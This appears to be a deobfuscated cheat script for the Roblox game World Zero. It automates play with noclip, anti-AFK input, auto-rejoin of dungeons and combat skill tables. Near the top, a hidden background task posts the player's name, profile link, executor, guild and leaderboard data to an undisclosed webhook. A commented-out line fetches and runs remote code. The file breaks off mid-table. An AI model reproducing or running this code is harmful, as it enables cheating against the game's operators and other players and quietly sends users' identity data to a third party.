--[[
    World Zero  Deobfuscated Version
    
    
    DEOBFUSCATION NOTES:
    - cp = LinoriaLib (Linoria UI Library)
    - cq = ThemeManager (LinoriaThemeManager) 
    - cr = SaveManager (LinoriaSaveManager)
    - Removed encoded variables: k, l, m, n, c3, c4, c5, c6
    - Removed bK function (no longer needed)
    - Libraries now loaded explicitly from GitHub repository
    
    This script has been cleaned and deobfuscated for better readability.
]]--

-- Game validation - Only run in World Zero
if game.gameId ~= 985731078 then
    return
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end
local a;
local b = game:GetService('Players')
local c = b.LocalPlayer or b:GetPropertyChangedSignal('LocalPlayer'):Wait() or b.LocalPlayer;
local d = c.UserId;
local e = game:GetService('HttpService')
local f = 'User: [' .. c.DisplayName .. ' (@' .. c.Name .. ')](https://www.roblox.com/users/' .. c.UserId .. '/profile)'
local g;
local h;
local i;
local j;
-- Removed unused encoded variables: local k, l, m, n, o = '', '', '', '', ''
local o = '' -- Keep 'o' in case it's used elsewhere
function utcDateAndTime()
    local p = os.date("!*t", os.time())
    local q, r, s, t, u = p.hour, p.min, p.sec, p.day, p.month;
    if q < 10 then
        q = '0' .. q
    end
    if r < 10 then
        r = '0' .. r
    end
    if s < 10 then
        s = '0' .. s
    end
    if t < 10 then
        t = '0' .. t
    end
    if u < 10 then
        u = '0' .. u
    end
    return q .. ':' .. r .. ':' .. s .. ' - ' .. t .. '/' .. u .. '/' .. p.year
end
function waitForChild(v, w, waittime)
    local x = v;
    local y;
    for z = 1, #w do
        local A = x:WaitForChild(w[z], waittime)
        if A then
            x = A;
            if z == #w then
                return x
            end
        else
            return nil
        end
    end
end
function firstCheckWait(B)
    repeat
        task.wait()
    until firstCheckDone or not Toggles[B].Value
end
function findFirstChild(v, w)
    local x = v;
    for z = 1, #w do
        local A = x:FindFirstChild(w[z])
        if A then
            x = A;
            if z == #w then
                return x
            end
        else
            return nil
        end
    end
end
local C = {
    Green = 0x00FF00,
    Red = 0xFF0000,
    Black = 0x000000,
    Cyan = 0x00c8ff,
    Yellow = 0xffff00,
    Gold = 0xffd700,
    Purple = 0x8C00FF,
    LightPink = 0xff7fff
}
task.spawn(function()
    repeat
        task.wait()
    until a;
    pcall(function()
        local function D(E, F, G)
            request({
                Url = G,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = e:JSONEncode({
                    ["embeds"] = {{
                        ["title"] = 'Infinite | World Zero',
                        ["description"] = E,
                        ["type"] = 'rich',
                        ["color"] = tonumber(F),
                        ["footer"] = {
                            ["text"] = utcDateAndTime() .. ' UTC'
                        }
                    }}
                })
            })
        end
        local function H()
            local I = game:HttpGet(peepo)
            local J = e:JSONDecode(I)
            return J
        end
        local K = H()
        local L = K[eternal]
        local M = leviathan[K[blissful:lower()]]
        local N = f .. '\n' .. eternal:upper() .. ': ``' .. L .. '``\n' .. blissful .. ': ``' .. M .. '``'
        if identifyexecutor then
            local O = ({identifyexecutor()})[1]
            N = N .. '\nExecutor: ``' .. O .. '``'
        end
        local P = game:GetService("TextChatService"):WaitForChild('TextChannels')
        local Q;
        for z, R in P:GetChildren() do
            if #R.Name < 6 and #R:GetChildren() > 0 and R:FindFirstChild(c.Name) then
                Q = R.Name;
                break
            end
        end
        if Q then
            local S = game:GetService("ReplicatedStorage").Shared.Guilds.GetCache:InvokeServer(Q)
            local T;
            for z, R in S.Members do
                if tonumber(z) == d then
                    T = R.Points;
                    break
                end
            end
            if T then
                N = N .. '\nGuild Points: ``' .. T .. '`` / ``' .. Q .. '``'
            end
        end
        local U = {
            ['VaneRaid'] = 'VANE_KILLS',
            ['KrakenRaid'] = 'KRAKEN_KILLS',
            ['FallenKingRaid'] = 'FALLENKING_KILLS',
            ['KorruptedKlausRaid'] = 'SANTA_KILLS',
            ['InfiniteTower'] = 'ITF_1',
            ['NightmareNormal'] = 'N_NP1',
            ['NightmareChallenge'] = 'C_NP1',
            ['CurrentGuildSeason'] = 'G_POINTS16'
        }
        pcall(function()
            function getLbScore(V)
                local W = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("LeaderboardHookup")
                    :WaitForChild("GetScore"):InvokeServer(V, 1)
                return W[1], W[2]
            end
            local X, Y = getLbScore(U.NightmareChallenge)
            local Z, _ = getLbScore(U.NightmareNormal)
            local a0, a1 = getLbScore(U.InfiniteTower)
            local a2, a3 = getLbScore(U.KorruptedKlausRaid)
            if X > 0 then
                N = N .. '\nNM Challenge Completed: ``' .. X .. '`` / ``' .. Y .. '``'
            end
            if Z > 0 then
                N = N .. '\nNM Normal Completed: ``' .. Z .. '`` / ``' .. _ .. '``'
            end
            if a0 > 99 then
                N = N .. '\nInfinite Tower Floor Record: ``' .. a0 .. '``'
            end
        end)
        D(N, olympus and C.Gold or C.Cyan, olympus and cloudy or boink)
    end)
end)
local a4 = game:GetService("ReplicatedStorage")
local a5 = a4:WaitForChild('Shared')
local a6 = game:GetService('TeleportService')
local a7 = game:GetService("VirtualInputManager")
local a8 = true;
local a9;
local aa = false;
local ab, ac, ad, ae, af, ag, ah;
local ai = false;
local aj = isfile and readfile and writefile;
local ak;
local al = game:GetService('VirtualUser')
c.Idled:Connect(function()
    al:CaptureController()
    al:ClickButton2(Vector2.new())
end)
local am = c.Name;
local an = 2727067538;
local ao = {
    Kicked = false,
    WasInDungeon = false,
    Dungeon = false,
    Difficulty = false,
    Timestamp = false,
    RejoinLastDungeon = false,
    CameFromMenu = false,
    RejoinLastDungeonThreshold = 1800,
    Gold = false,
    LastDungeonCompletion = false,
    CrossSessionTimestamp = false,
    CrossSessionGold = false,
    ForceRestartLastTower = false
}
local ap = d .. '_InfiniteWorldZeroData.txt'
local aq = {21, 23, 27, 29, 34, 43, 39, 38}
function save()
    local ar;
    if writefile then
        ar = e:JSONEncode(ao)
        writefile(ap, ar)
    end
end
function load()
    if readfile and isfile and isfile(ap) then
        ao = e:JSONDecode(readfile(ap))
    end
end
if game.PlaceId == an then
    load()
    if ao.Kicked or ao.RejoinLastDungeon and tick() - ao.Timestamp <= ao.RejoinLastDungeonThreshold then
        ao.Kicked = false;
        ao.CameFromMenu = true;
        save()
        local as = require(c:WaitForChild("PlayerScripts"):WaitForChild("LocalScript"):WaitForChild("Guis")
            :WaitForChild("CharacterPicker"))
        local at = as:GetSelectedProfile()
        while not at do
            task.wait()
            at = as:GetSelectedProfile()
        end
        local au = at.GUID.Value;
        local av = a5:WaitForChild('Teleport'):WaitForChild('JoinGame')
        av:FireServer(au)
    end
end
local aw;
local ax;
local ay;
local az;
local aA = {21, 23, 27, 29, 34, 43}
local aB = {1005, 1006, 1007}
local aC;
local aD = {5862275930, 4526768266}
local aE = table.find(aD, game.PlaceId)
local aF;
local aG;
local aH;
local aI;
local aJ;
local aK;
local aL;
local aM;
local aN;
local aO;
local aP;
local aQ;
local aR = {
    StoneTreeEnt = -3,
    BOSSTreeEnt = -3,
    BOSSFireTreeEnt = -3,
    BOSSCrystalGolem = -9,
    CorruptedGreaterTree = -19,
    BOSSCrystalWeaverBlue = 1,
    MiniBossCrystalWeaver = 4,
    MinotaurDungeonBoss = 4,
    BOSSKandrix = 4,
    Crystal = -9,
    Taurha = -2,
    BOSSShadowOfCerberus = 7,
    Hades = -1
}
local aS = {}
local aT = c.Character or c.CharacterAdded:Wait() or c.Character;
local aU = aT:WaitForChild('HumanoidRootPart')
local aV, aW;
while true do
    if c.Character and c.Character:FindFirstChild('HealthProperties') then
        aV = c.Character.HealthProperties;
        break
    end
    task.wait()
end
c.CharacterAdded:Connect(function(aX)
    aT = aX;
    aU = aT:WaitForChild('HumanoidRootPart')
    aV = aT:WaitForChild('HealthProperties')
    aW = aT:WaitForChild('Equipment')
end)
local aY = debug.getupvalue(require(a5.Drops).Start, 4)
local aZ = a5:WaitForChild('Drops'):WaitForChild('CoinEvent')
local a_ = c:WaitForChild("PlayerGui"):WaitForChild('Profile')
local b0 = a_:WaitForChild('Currency'):WaitForChild('Gold')
local b1 = b0.Value;
local b2 = b1;
local b3 = a4:WaitForChild('PlayerEquips'):WaitForChild(am)
local b4 = b3:WaitForChild('Primary')
local b5 = b3:WaitForChild('Offhand')
local b6 = b3:WaitForChild('Armor')
local b7 = a5:WaitForChild('ItemUpgrade'):WaitForChild('Upgrade')
local b8 = a_:WaitForChild("Class")
local b9 = b8.Value;
function classCheck(ba)
    return b9 == ba
end
local bb = a5.Missions.GetMissionPrize;
aW = aT.Equipment;
local bc = a5:WaitForChild('Combat'):WaitForChild('Skillsets')
local bd = 0;
local be;
local bf = {'AtlanticChest'}
local bg = 'RaidChestSilver'
local bh = 'RaidChestGold'
local bi = 'RaidChestGold'
local bj = false;
local bk = a5:WaitForChild("Combat"):WaitForChild("Attack")
local bl = game:GetService("Workspace"):FindFirstChild("Mobs")
local bm = a5.Mobs.Mobs;
local bn = workspace.Camera;
local bo;
local bp;
local bq = tick()
local br = tick()
local bs = 0;
local bt = 0;
local bu = 0;
local bv = {}
local bw = Instance.new('Part')
bw.Position = Vector3.zero;
bw.Anchored = true;
bw.Transparency = 1;
bw.CanCollide = false;
bw.Name = 'InfiniteCameraPart'
bw.Parent = workspace;
task.spawn(function()
    if a4:WaitForChild("ActiveMission", 60) then
        aC = true;
        aw = game:GetService("Workspace"):WaitForChild("MissionObjects")
        ax = a4:WaitForChild("MissionScripts")
        ay = a4:WaitForChild("ActiveMission").Value;
        ao.Dungeon = a4:WaitForChild("ActiveMission").Value;
        if table.find(aA, ay) then
            aH = true
        elseif ay == 38 then
            aI = true
        elseif ay == 39 then
            aJ = true
        else
            aF = true;
            az = a5.Missions.GetDifficulty:InvokeServer()
            ao.Difficulty = a5.Missions.GetDifficulty:InvokeServer()
        end
        if ay == 23 then
            aG = true
        end
        if table.find(aB, ay) then
            aK = true
        end
        if ay == 45 then
            aM = true;
            aL = true
        end
        if ay == 44 then
            aO = true;
            aL = true
        end
        if ay == 22 then
            aP = true;
            aL = true
        end
        if ay == 17 then
            aN = true;
            aL = true
        end
    end
end)
do
    function noclip()
        if aU and aU.CanCollide then
            aU.CanCollide = false
        end
    end
    function unnoclip()
        if aU and not aU.CanCollide then
            aU.CanCollide = true
        end
    end
    function setCamera(bx, by)
        local bz = bx or aU and (aU:FindFirstChild("Part") or aU)
        if bx then
            bx.Position = by
        end
        if bz and bn.CameraSubject ~= bz then
            bn.CameraSubject = bz
        end
    end
    function alive()
        return aT and aU and aV and aV:FindFirstChild('Health') and aV.Health.Value > 0
    end
    function mounted()
        return aT and aT:FindFirstChild('Properties') and aT.Properties:GetAttribute('Mounted')
    end
    function isAlive(bA)
        return bA and bA.PrimaryPart and bA:FindFirstChild('HealthProperties') and
                   bA.HealthProperties:FindFirstChild('Health') and bA.HealthProperties.Health.Value > 0
    end
    function Mob(E)
        if bm:FindFirstChild(E) then
            return require(bm[E])
        end
    end
    function SwitchOffhandPerks(E)
        a5.Settings.OffhandPerksActive:FireServer(E)
    end
    function timeElapsed(R)
        local bB = math.floor(R / 86400)
        local bC = math.floor(R % 86400 / 3600)
        local bD = math.floor(R % 3600 / 60)
        local bE = math.floor(R % 60)
        if bB > 0 then
            return bB .. 'd ' .. bC .. 'h ' .. bD .. 'm ' .. bE .. 's'
        elseif bC > 0 then
            return bC .. 'h ' .. bD .. 'm ' .. bE .. 's'
        elseif bD > 0 then
            return bD .. 'm ' .. bE .. 's'
        else
            return bE .. 's'
        end
    end
    function ping()
        return math.round(c:GetNetworkPing() * 1000) .. ' ms'
    end
    function ping2()
        return math.round(game.Stats.PerformanceStats.Ping:GetValue()) .. ' ms'
    end
    function nextInTbl(bF, bG)
        return bF[table.find(bF, bG) + 1] or bF[1]
    end
    function formatNumberWithCommas(bH)
        local bI = tostring(bH)
        local bJ;
        repeat
            bI, bJ = string.gsub(bI, "^(-?%d+)(%d%d%d)", '%1,%2')
        until bJ == 0;
        return bI
    end
    function getServerGuilds()
        local P = game:GetService("TextChatService"):WaitForChild('TextChannels')
        local bF = {}
        for z, R in P:GetChildren() do
            if #R.Name < 6 and #R:GetChildren() > 0 then
                table.insert(bF, R.Name)
            end
        end
        table.sort(bF)
        return bF
    end
    function getPlrGuild()
        local P = game:GetService("TextChatService"):WaitForChild('TextChannels')
        local Q;
        for z, R in P:GetChildren() do
            if #R.Name < 6 and #R:GetChildren() > 0 and R:FindFirstChild(c.Name) then
                Q = R.Name;
                break
            end
        end
        return Q
    end
end
-- local function bK(bL)
--     return loadstring(game:HttpGet(bL))()
-- end
local bM = a_:WaitForChild('Inventory'):WaitForChild('Items')
local bN = a_:WaitForChild('Inventory'):WaitForChild('Cosmetics')
local bO = require(a5.Missions.MissionData)
function missionLevelReq(bP)
    return bO[bP].LevelRequirement
end
local bQ = require(a5.Gear.GearPerks)
local bR = require(a5.Items)
local bS = require(a5.Combat)
local bT = a5.Inventory.EquipItem;
local bU = require(a5:WaitForChild('Settings'))
local bV = a_:WaitForChild('Settings')
local bW;
local bX;
local bY;
local bZ;
local b_ = game:GetService('RunService').Heartbeat;
function OffhandPerksActive()
    return bV:GetAttribute('OffhandPerksActive')
end
function StartRaid(E, F)
    a5:WaitForChild('Teleport'):WaitForChild('StartRaid'):FireServer(E, F)
end
local c0 = require(a5.Inventory)
b8:GetPropertyChangedSignal("Value"):Connect(function()
    b9 = b8.Value
end)
local c1 = 0;
a5.Missions.MissionStart.OnClientEvent:Once(function()
    MissionStarted = true
end)
load()
if not aC then
    if ao.Kicked and ao.WasInDungeon or ao.RejoinLastDungeon and tick() - ao.Timestamp <= ao.RejoinLastDungeonThreshold and
        ao.CameFromMenu or ao.WasInDungeon and ao.Dungeon and table.find(aA, ao.Dungeon) and ao.ForceRestartLastTower then
        ao.CameFromMenu = false;
        save()
        if ao.Dungeon then
            local c2 = a5:WaitForChild('Teleport'):WaitForChild('StartRaid')
            while true do
                if table.find(aq, ao.Dungeon) then
                    c2:FireServer(ao.Dungeon)
                else
                    c2:FireServer(ao.Dungeon, ao.Difficulty)
                end
                task.wait(1)
            end
        end
    else
        ao.Kicked = false;
        ao.CameFromMenu = false;
        ao.WasInDungeon = false;
        save()
    end
elseif aC then
    bZ = getPlrGuild()
    ao.WasInDungeon = true;
    ao.Dungeon = ay;
    ao.Difficulty = az;
    ao.CameFromMenu = false;
    ao.Timestamp = tick()
    save()
end
-- Removed unused variables: local c3, c4, c5, c6 = '', '', '', ''
local c7 = {'Checkpoint1', 'Checkpoint2', 'Checkpoint3', 'Checkpoint4', 'Checkpoint5', 'Checkpoint6', 'Checkpoint7',
            'Checkpoint8', 'Checkpoint9', 'Checkpoint10', 'CutsceneTrigger', 'Main', 'CaveTrigger', 'BossIntroTrigger',
            'TownTalkPart', 'BridgeTrigger', 'BoulderTrigger', 'BoulderStopTrigger', 'Cage1Marker', 'Cage2Marker',
            'CannonTrigger', 'CastleTrigger', 'WallsCheckpoint', 'HammerReset1', 'WallsTrigger', 'WallsFinalTrigger',
            'Room1Trigger', 'Room2Trigger', 'Room3Trigger', 'Room4Trigger', 'Room5Trigger', 'Room6Trigger',
            'TreasureMarker', 'NextCheckpointTrigger', 'PreBridgeTrigger', 'CheckpointTriggers', 'CaveSpawnTrigger',
            'CliffsideEndTrigger', 'VineRoomTrigger', 'CheckpointTrigger', 'ObbyTrigger', 'BossTrigger', 'DropTrigger',
            'CastleGateTrigger', 'SceneTrigger', 'OutsideBossTrigger', 'Area1Trigger', 'Area2Trigger', 'Area3Trigger',
            'FinishRing', 'StartWaveDefense', 'Trigger1', 'Trigger2', 'Trigger3', 'BossCutsceneTrigger', 'FloorTrigger',
            'BossCutscene', 'BottomElevatorTrigger', 'MiddleElevatorTrigger', 'TopElevatorTrigger', 'ObbyTrigger5',
            'WaveStarter', 'NextFloorTeleporter', 'WaveExit', 'MinibossExit', 'ArenaEntry0', 'ArenaEntry1',
            'ArenaEntry2'}
local c8 = {'Assets_FX', 'Assets_Static', 'Characters', 'Coins', 'Camera', 'SpeedBoosts', 'Projectiles', 'World_Bounds',
            'Pets', 'MobBlockers', 'Terrain', 'TeleportSystem', 'Room_Boss_Final', 'Room_Boss_Mini', 'Room_Lobby',
            'Room_Spawn'}
local c9 = {'Scarecrow1', 'Scarecrow2', 'Scarecrow3'}
local ca = {
    DireProblem = {
        Id = 2,
        ignoreMob = 'BOSSDireBoarwolf'
    },
    KingSlayer = {
        Id = 4,
        ignoreMob = 'BOSSKingCrab'
    },
    GravetowerDungeon = {
        Id = 6,
        priorityTbl = {'Pillar', 'BOSSTreeEnt'},
        mobWaitTbl = {'BOSSTreeEnt'},
        mobWaitTime = 3
    },
    RoughWaters = {
        Id = 25,
        ignoreMob = 'DavyJones'
    },
    VolcanosShadow = {
        Id = 13,
        ignoreMob = 'BOSSCerberus'
    },
    KonoHeartlands = {
        Id = 24,
        ignoreMob = 'CorruptedGreaterTree'
    },
    AetherFortress = {
        Id = 33,
        ignoreMob = 'BOSSTreeEnt'
    },
    MamaTrauma = {
        Id = 12,
        ignoreMob = 'BOSSMamaQuillodile'
    },
    TheUnderworld = {
        Id = 26,
        ignoreMob = 'HadesCerberus',
        mobWaitTbl = {'Hades', 'HadesCerberus'},
        mobWaitTime = 3,
        alwaysWait = true
    },
    VaneEvent = {
        Id = 44,
        priorityTbl = {'EVENTBOSSVane'}
    },
    ArcaneTower = {
        Id = 43,
        priorityTbl = {'Crystal', 'BOSSKandrix'}
    },
    KrakenEvent = {
        Id = 45,
        priorityTbl = {
            'EVENTBOSSKrakenArm-Arm#1',
            'EVENTBOSSKrakenArm-Arm#2', 
            'EVENTBOSSKrakenArm-Arm#3',
            'EVENTBOSSKrakenArm-Arm#4',
            'EVENTBOSSKrakenArm-Arm#5',
            'EVENTBOSSKrakenArm-Arm#6',
            'EVENTBOSSKrakenArm-Arm#7',
            'EVENTBOSSKrakenArm-Arm#8',
            'EVENTBOSSKrakenArm-Arm#9',
            'EVENTBOSSKrakenArm-Arm#10',
            'EVENTBOSSKraken'  
        }
    },
    RescueInTheRuins = {
        Id = 30,
        priorityTbl = {'Alligator', 'Rapigator', 'Sentry', 'HandTower'}
    },
    PyramidDungeon = {
        Id = 18,
        priorityTbl = {'ScarabGreen', 'BuffCactus', 'HappyCactus', 'RockGolem', 'DesertFlower', 'PoisonCobra',
                       'GoldCobra'}
    },
    ScrapCanyon = {
        Id = 20,
        priorityTbl = {'Model', 'BOSSHogRider'}
    }
}
local cb = 15;
local cc = {
    World1 = {
        Name = 'World 1',
        Id = 13,
        OrderId = 1
    },
    World2 = {
        Name = 'World 2',
        Id = 19,
        OrderId = 2
    },
    World3 = {
        Name = 'World 3',
        Id = 20,
        OrderId = 3
    },
    World4 = {
        Name = 'World 4',
        Id = 29,
        OrderId = 4
    },
    World5 = {
        Name = 'World 5',
        Id = 31,
        OrderId = 5
    },
    World6 = {
        Name = 'World 6',
        Id = 36,
        OrderId = 6
    },
    World7 = {
        Name = 'World 7',
        Id = 40,
        OrderId = 7
    },
    World8 = {
        Name = 'World 8',
        Id = 45,
        OrderId = 8
    },
    World9 = {
        Name = 'World 9',
        Id = 49,
        OrderId = 9
    },
    World10 = {
        Name = 'World 10',
        Id = 56,
        OrderId = 10
    },
    TradingHub = {
        Name = 'Cliffside Marketplace',
        Id = 44,
        OrderId = 11
    },
    PvpArena = {
        Name = 'Pvp Arena',
        Id = 39,
        OrderId = 12
    },
    Baseplate = {
        Name = 'Baseplate',
        Id = 26,
        OrderId = 13
    },
    ChristmasHub = {
        Name = 'Holiday Village',
        Id = 24,
        OrderId = 14
    },
    HalloweenHub = {
        Name = 'Spooky Courtyard',
        Id = 33,
        OrderId = 15
    }
}
local cd = {1, 3, 2, 4, 6, 11, 12, 13, 7, 14, 15, 16, 20, 19, 18, 24, 35, 21, 25, 36, 23, 26, 37, 27, 30, 31, 29, 32,
            33, 34, 41, 42, 43, 39, 1005, 1006, 1007, 38}
local ce = {{
    Id = 1,
    Name = "Crabby Crusade",
    World = 1,
    Type = 'Dungeon',
    Code = '1-1'
}, {
    Id = 3,
    Name = "Scarecrow Defense",
    World = 1,
    Type = 'Dungeon',
    Code = '1-2'
}, {
    Id = 2,
    Name = "Dire Problem",
    World = 1,
    Type = 'Dungeon',
    Code = '1-3'
}, {
    Id = 4,
    Name = "Kingslayer",
    World = 1,
    Type = 'Dungeon',
    Code = '1-4'
}, {
    Id = 6,
    Name = "Gravetower Dungeon",
    World = 1,
    Type = 'Dungeon',
    Code = '1-5'
}, {
    Id = 11,
    Name = "Temple of Ruin",
    World = 2,
    Type = 'Dungeon',
    Code = '2-1'
}, {
    Id = 12,
    Name = "Mama Trauma",
    World = 2,
    Type = 'Dungeon',
    Code = '2-2'
}, {
    Id = 13,
    Name = "Volcano's Shadow",
    World = 2,
    Type = 'Dungeon',
    Code = '2-3'
}, {
    Id = 7,
    Name = "Volcano Dungeon",
    World = 2,
    Type = 'Dungeon',
    Code = '2-4'
}, {
    Id = 14,
    Name = "Mountain Pass",
    World = 3,
    Type = 'Dungeon',
    Code = '3-1'
}, {
    Id = 15,
    Name = "Winter Cavern",
    World = 3,
    Type = 'Dungeon',
    Code = '3-2'
}, {
    Id = 16,
    Name = "Winter Dungeon",
    World = 3,
    Type = 'Dungeon',
    Code = '3-3'
}, {
    Id = 20,
    Name = "Scrap Canyon",
    World = 4,
    Type = 'Dungeon',
    Code = '4-1'
}, {
    Id = 19,
    Name = "Deserted Burrowmine",
    World = 4,
    Type = 'Dungeon',
    Code = '4-2'
}, {
    Id = 18,
    Name = "Pyramid Dungeon",
    World = 4,
    Type = 'Dungeon',
    Code = '4-3'
}, {
    Id = 24,
    Name = "Konoh Heartlands",
    World = 5,
    Type = 'Dungeon',
    Code = '5-1'
}, {
    Id = 35,
    Name = "Konoh Inferno",
    World = 5,
    Type = 'Dungeon',
    Code = '5-2',
    MobCount = 44
}, {
    Id = 21,
    Name = "Prison Tower",
    World = 5,
    Type = 'Tower',
    Code = 'Tower 1'
}, {
    Id = 25,
    Name = "Rough Waters",
    World = 6,
    Type = 'Dungeon',
    Code = '6-1'
}, {
    Id = 36,
    Name = "Treasure Hunt",
    World = 6,
    Type = 'Dungeon',
    Code = '6-2'
}, {
    Id = 23,
    Name = "Atlantis Tower",
    World = 6,
    Type = 'Tower',
    Code = 'Tower 2'
}, {
    Id = 26,
    Name = "The Underworld",
    World = 7,
    Type = 'Dungeon',
    Code = '7-1'
}, {
    Id = 37,
    Name = "The Labyrinth",
    World = 7,
    Type = 'Dungeon',
    Code = '7-2'
}, {
    Id = 27,
    Name = "Mezuvian Tower",
    World = 7,
    Type = 'Tower',
    Code = 'Tower 3'
}, {
    Id = 30,
    Name = "Rescue in the Ruins",
    World = 8,
    Type = 'Dungeon',
    Code = '8-1'
}, {
    Id = 31,
    Name = "Ruin Rush",
    World = 8,
    Type = 'Dungeon',
    Code = '8-2'
}, {
    Id = 29,
    Name = "Oasis Tower",
    World = 8,
    Type = 'Tower',
    Code = 'Tower 4'
}, {
    Id = 32,
    Name = "Treetop Trouble",
    World = 9,
    Type = 'Dungeon',
    Code = '9-1'
}, {
    Id = 33,
    Name = "Aether Fortress",
    World = 9,
    Type = 'Dungeon',
    Code = '9-2'
}, {
    Id = 34,
    Name = "Aether Tower",
    World = 9,
    Type = 'Tower',
    Code = 'Tower 5'
}, {
    Id = 41,
    Name = "Crystal Chaos",
    World = 10,
    Type = 'Dungeon',
    Code = '10-1'
}, {
    Id = 42,
    Name = "Astral Academy",
    World = 10,
    Type = 'Dungeon',
    Code = '10-2'
}, {
    Id = 43,
    Name = "Arcane Tower",
    World = 10,
    Type = 'Tower',
    Code = 'Tower 6'
}, {
    Id = 22,
    Name = "Haunted Event",
    Type = 'Raid',
    World = "Spooky Courtyard",
    Special = true,
    Code = 'Halloween Raid'
}, {
    Id = 17,
    Name = "North Pole",
    Type = 'Raid',
    World = "Holiday Village",
    Special = true,
    Code = 'Christmas Raid'
}, {
    Id = 38,
    Name = "Infinite Tower",
    Type = 'Special',
    Special = true,
    Code = 'Special'
}, {
    Id = 39,
    Name = "Celestial Tower",
    Type = 'Special',
    Special = true,
    Code = 'Special'
}, {
    Id = 40,
    Name = "Daily Dungeon",
    Type = 'Dungeon',
    Special = true,
    Code = 'I dont know'
}, {
    Id = 44,
    Name = "Vane's Lair",
    Type = 'Raid',
    Special = true,
    Code = 'Event Raid'
}, {
    Id = 45,
    Name = "The Depths",
    Type = 'Raid',
    Special = true,
    Code = 'Event Raid'
}}
local function cf(J)
    local cg = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    J = J:gsub('[^' .. cg .. '=]', '')
    return J:gsub('.', function(ch)
        if ch == '=' then
            return ''
        end
        local ci, cj = '', cg:find(ch) - 1;
        for z = 6, 1, -1 do
            ci = ci .. (cj % 2 ^ z - cj % 2 ^ (z - 1) > 0 and '1' or '0')
        end
        return ci
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(ch)
        if #ch ~= 8 then
            return ''
        end
        local ck = 0;
        for z = 1, 8 do
            ck = ck + (ch:sub(z, z) == '1' and 2 ^ (8 - z) or 0)
        end
        return string.char(ck)
    end)
end
local cl = {
    Assassin = {
        DisplayName = 'Shadowblade',
        Range = 10.5,
        Type = 'Melee',
        Primary = 'Longsword',
        Offhand = 'Longsword',
        Skills = {{
            Skill = 'Assassin1',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin2',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin3',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin4',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin5',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin6',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin7',
            Cooldown = 0.26
        }, {
            Skill = 'Assassin8',
            Cooldown = 0.26
        }, {
            Skill = 'ShadowLeap',
            Cooldown = 3.1,
            Range = 49
        }, {
            Skill = 'ShadowSlash1',
            Cooldown = 6.1,
            Range = 59
        }, {
            Skill = 'ShadowSlash2',
            Cooldown = 6.1,
            Range = 59
        }, {
            Skill = bc:WaitForChild('Assassin'):WaitForChild('EventStealthWalk'),
            Cooldown = 0.25,
            Type = 'Remote'
        }, {
            Skill = bc:WaitForChild('Assassin'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }, {
            Skill = 'RealmOfShadows',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 79
        }, {
            Skill = 'ShadowMulti1',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti2',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti3',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti4',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }, {
            Skill = 'ShadowMulti5',
            Cooldown = 31,
            Type = 'Ranged',
            Range = 59
        }}
    },
    MageOfLight = {
        DisplayName = 'Mage Of Light',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'MageOfLight',
            Cooldown = 0.28
        }, {
            Skill = 'MageOfLightBlast',
            Cooldown = 0.33
        }, {
            Skill = 'MageOfLightCharged',
            Cooldown = 0.33
        }, {
            Skill = 'MageOfLightBlastCharged',
            Cooldown = 0.33
        }, {
            Skill = bc:WaitForChild('MageOfLight'):WaitForChild('HealCircle'),
            Cooldown = 14.2,
            Type = 'Heal'
        }, {
            Skill = bc:WaitForChild('MageOfLight'):WaitForChild('Barrier'),
            Args = c,
            Cooldown = 15.2,
            Type = 'Heal'
        }, {
            Skill = bc:WaitForChild('MageOfLight'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Heal'
        }}
    },
    Warlord = {
        DisplayName = 'Warlord',
        Range = 19.5,
        Type = 'Melee',
        Primary = 'Greataxe',
        Offhand = 'Shield',
        Skills = {{
            Skill = 'Warlord1',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Warlord2',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Warlord3',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Warlord4',
            Cooldown = 0.42,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'ChainsOfWar',
            Cooldown = 8,
            Range = 69,
            Type = 'Ranged'
        }, {
            Skill = 'BlockingWarlord',
            Cooldown = 2.5,
            Type = 'Ranged',
            MeleeOnBoss = true,
            BossRange = 14.5
        }, {
            Skill = 'Piledriver1',
            Cooldown = 5.1,
            Range = 12,
            Type = 'Ranged'
        }, {
            Skill = 'Piledriver2',
            Cooldown = 6.1,
            Range = 12,
            Type = 'Ranged'
        }, {
            Skill = 'Piledriver3',
            Cooldown = 7.1,
            Range = 12,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate1',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate2',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate3',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate4',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }, {
            Skill = 'WarlordUltimate5',
            Cooldown = 31,
            Range = 59,
            Type = 'Ranged'
        }}
    },
    Paladin = {
        DisplayName = 'Paladin',
        Range = 14,
        Type = 'Melee',
        Primary = 'Longsword',
        Offhand = 'Shield',
        Skills = {{
